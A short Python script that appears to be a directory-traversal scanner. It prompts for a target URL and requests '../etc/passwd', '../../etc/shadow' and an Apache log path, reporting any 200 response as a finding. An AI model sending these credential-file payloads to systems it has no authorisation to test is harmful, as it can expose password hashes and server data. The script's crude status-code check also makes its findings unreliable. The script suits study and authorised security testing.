#!/usr/bin/env python3
import requests

def directory_traversal_checker(target_url):
    """[Check for directory traversal vulnerabilities]"""
    payloads = [
        "../etc/passwd",
        "../../etc/shadow",
        "../../../var/log/apache2/access.log"
    ]

    for payload in payloads:
        response = requests.get(target_url + "/" + payload)
        if response.status_code == 200:
            print(f"Directory traversal vulnerability found with: {payload}")

# User input
target_url = input("\033[91mint4 [Enter the Target URL for Directory Traversal Testing] > \033[0m")
directory_traversal_checker(target_url)